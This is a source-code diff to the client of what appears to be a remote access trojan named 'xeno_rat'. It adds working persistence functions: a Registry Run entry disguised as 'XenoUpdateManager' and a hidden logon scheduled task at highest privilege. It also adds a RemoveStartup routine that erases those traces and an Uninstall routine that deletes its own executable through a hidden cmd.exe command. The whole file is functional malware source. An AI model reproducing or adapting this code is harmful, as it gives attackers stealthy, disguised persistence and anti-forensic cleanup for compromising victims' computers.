@@ -1,5 +1,6 @@
 ﻿using Microsoft.Win32;
 using System;
+using System.CodeDom;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -7,10 +8,12 @@ using System.Linq;
 using System.Management;
 using System.Net;
 using System.Net.Sockets;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
+using System.Xml.Linq;
 
 namespace xeno_rat_client
 {
@@ -167,24 +170,174 @@ namespace xeno_rat_client
             }
             return conn;
         }
-        public static bool AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
+        public async static Task RemoveStartup(string executablePath) 
         {
-            // Set the registry key path
-            string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            await Task.Run(() =>
+            {
+                if (Utils.IsAdmin())
+                {
+                    try
+                    {
+                        Process process = new Process();
+                        process.StartInfo.FileName = "schtasks.exe";
+                        process.StartInfo.Arguments = $"/query /v /fo csv";
+                        process.StartInfo.UseShellExecute = false;
+                        process.StartInfo.RedirectStandardOutput = true;
+                        process.StartInfo.CreateNoWindow = true;
+                        process.Start();
+                        string output = process.StandardOutput.ReadToEnd();
+                        try { process.WaitForExit(); } catch { }
+                        process.Dispose();
+                        string[] csv_data = output.Split('\n');
+                        if (csv_data.Length > 1)
+                        {
+                            List<string> keys = csv_data[0].Replace("\"", "").Split(',').ToList();
+                            int nameKey = keys.IndexOf("TaskName");
+                            int actionKey = keys.IndexOf("Task To Run");
+                            foreach (string csv in csv_data)
+                            {
+                                string[] items = csv.Split(new string[] { "\",\"" }, StringSplitOptions.None);
+                                if (keys.Count != items.Length)
+                                {
+                                    continue;
+                                }
+                                if (nameKey == -1 || actionKey == -1)
+                                {
+                                    continue;
+                                }
 
+                                if (items[actionKey].Replace("\"", "").Trim() == executablePath)
+                                {
+                                    try
+                                    {
+                                        Process proc = new Process();
+                                        proc.StartInfo.FileName = "schtasks.exe";
+                                        proc.StartInfo.Arguments = $"/delete /tn \"{items[nameKey]}\" /f";
+                                        proc.StartInfo.UseShellExecute = false;
+                                        proc.StartInfo.RedirectStandardOutput = true;
+                                        proc.StartInfo.CreateNoWindow = true;
+
+                                        proc.Start();
+                                        try { proc.WaitForExit(); } catch { }
+                                        process.Dispose();
+                                    }
+                                    catch { }
+                                }
+                            }
+                        }
+                    }
+                    catch { }
+                }
+                string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+                try
+                {
+                    using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
+                    {
+                        foreach (string i in key.GetValueNames())
+                        {
+                            if (key.GetValue(i).ToString().Replace("\"", "").Trim() == executablePath)
+                            {
+                                key.DeleteValue(i);
+                            }
+                        }
+                    }
+                }
+                catch
+                {
+                }
+            });
+
+            
+        }
+        public async static Task Uninstall() 
+        {
+            await RemoveStartup(Assembly.GetEntryAssembly().Location);
+            Process.Start(new ProcessStartInfo()
+            {
+                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetEntryAssembly().Location + "\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                FileName = "cmd.exe"
+            });
+            Process.GetCurrentProcess().Kill();
+        }
+
+        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
+        {
+            return await Task.Run(() =>
+                   {
+                        string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+                        try
+                        {
+                            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
+                            {
+                                key.SetValue(name, "\"" + executablePath + "\"");
+                            }
+                            return true;
+                        }
+                        catch
+                        {
+                            return false;
+                        }
+                   });
+        }
+        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "XenoUpdateManager")
+        {
             try
             {
-                // Open the Run key with RegistryView.Registry64 option
-                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
+                string xmlContent = $@"
+                <Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
+                  <Triggers>
+                    <LogonTrigger>
+                      <Enabled>true</Enabled>
+                    </LogonTrigger>
+                  </Triggers>
+                  <Principals>
+                    <Principal id='Author'>
+                      <LogonType>InteractiveToken</LogonType>
+                      <RunLevel>HighestAvailable</RunLevel>
+                    </Principal>
+                  </Principals>
+                  <Settings>
+                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+                    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
+                  </Settings>
+                  <Actions>
+                    <Exec>
+                      <Command>{executablePath}</Command>
+                    </Exec>
+                  </Actions>
+                </Task>";
+
+                string tempXmlFile = Path.GetTempFileName();
+                File.WriteAllText(tempXmlFile, xmlContent);
+
+                Process process = new Process();
+                process.StartInfo.FileName = "schtasks.exe";
+                process.StartInfo.Arguments = $"/Create /TN \"{name}\" /XML \"{tempXmlFile}\" /F";
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.CreateNoWindow = true;
+
+                process.Start();
+
+                await Task.Delay(3000);
+                string output = process.StandardOutput.ReadToEnd();
+
+                File.Delete(tempXmlFile);
+
+                if (output.Contains("SUCCESS"))
                 {
-                    key.SetValue(name, "\"" + executablePath + "\"");
+                    return true;
                 }
-                return true;
             }
             catch
             {
-                return false;
+                
             }
+
+            return false; 
         }
     }
 }
